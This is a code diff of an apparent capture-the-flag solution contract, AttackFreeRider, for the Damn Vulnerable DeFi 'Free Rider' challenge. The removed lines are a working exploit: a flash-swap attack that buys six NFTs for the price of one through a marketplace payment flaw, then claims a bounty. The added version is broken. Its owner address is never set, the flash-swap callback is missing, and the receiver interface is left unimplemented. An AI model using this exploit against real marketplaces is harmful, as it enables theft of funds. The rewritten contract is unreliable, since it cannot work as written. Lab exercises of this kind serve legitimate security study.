@@ -1,80 +1,38 @@
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity = 0.8.25;
 
-import "lib/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
-import "lib/v2-periphery/contracts/interfaces/IWETH.sol";
-import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
-import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
+import {FreeRiderRecoveryManager} from '../../src/free-rider/FreeRiderRecoveryManager.sol';
+import {IERC721Receiver} from "lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";
+import {WETH} from "lib/solmate/src/tokens/WETH.sol";
+import {IUniswapV2Pair} from "lib/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
+import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
-interface IMarketplace {
-    function buyMany(uint256[] calldata tokenIds) external payable;
-}
-
-contract AttackFreeRider {
-
-    IUniswapV2Pair private immutable pair;
-    IMarketplace private immutable marketplace;
-
-    IWETH private immutable weth;
-    IERC721 private immutable nft;
-
-    address private immutable recoveryContract;
-    address private immutable player;
-
-    uint256 private constant NFT_PRICE = 15 ether;
-    uint256[] private tokens = [0, 1, 2, 3, 4, 5];
-
-    constructor(address _pair, address _marketplace, address _weth, address _nft, address _recoveryContract){
-        pair = IUniswapV2Pair(_pair);
-        marketplace = IMarketplace(_marketplace);
-        weth = IWETH(_weth);
-        nft = IERC721(_nft);
-        recoveryContract = _recoveryContract;
-        player = msg.sender;
+contract AttackFreeRider is IERC721Receiver {
+    WETH weth;
+    FreeRiderNFTMarketplace marketplace;
+    FreeRiderRecoveryManager recoveryManager;
+    DamnValuableNFT nft;
+    IUniswapV2Pair uniswapPair;
+    address owner;
+    constructor (
+        WETH _weth,
+        IUniswapV2Pair _uniswapPair,
+        FreeRiderNFTMarketplace _marketplace,
+        FreeRiderRecoveryManager _recoveryManager,
+        DamnValuableNFT _nft
+    ) payable {
+        weth = _weth;
+        marketplace = _marketplace;
+        recoveryManager = _recoveryManager;
+        nft = _nft;
+        uniswapPair = _uniswapPair;
     }
 
-    function attack() external payable {
+    uint256 constant NFT_PRICE = 15 ether;
+    uint256 constant AMOUNT_OF_NFTS = 6;
 
-        // 1. Request a flashSwap of 15 WETH from Uniswap Pair
+    function attack() public payable {
         bytes memory data = abi.encode(NFT_PRICE);
-        pair.swap(NFT_PRICE, 0, address(this), data);
+        uniswapPair.swap(15 ether, 0, address(owner), data);
     }
-
-    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
-
-        // Access Control
-        require(msg.sender == address(pair));
-        require(tx.origin == player);
-
-        // 2. Unwrap WETH to native ETH
-        weth.withdraw(NFT_PRICE);
-
-        // 3. Buy 6 NFTS for only 15 ETH total
-        marketplace.buyMany{value: NFT_PRICE}(tokens);
-
-        // 4. Pay back 15WETH + 0.3% to the pair contract
-        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
-        weth.deposit{value: amountToPayBack}();
-        weth.transfer(address(pair), amountToPayBack);
-
-        // 5. Send NFTs to recovery contract so we can get the bounty
-        bytes memory data = abi.encode(player);
-        for(uint256 i; i < tokens.length; i++){
-            nft.safeTransferFrom(address(this), recoveryContract, i, data);
-        }
-        
-    }
-
-    function onERC721Received(
-        address,
-        address,
-        uint256,
-        bytes memory
-    ) external pure returns (bytes4) {
-        return IERC721Receiver.onERC721Received.selector;
-    }
-
-
-    receive() external payable {}
-
 }
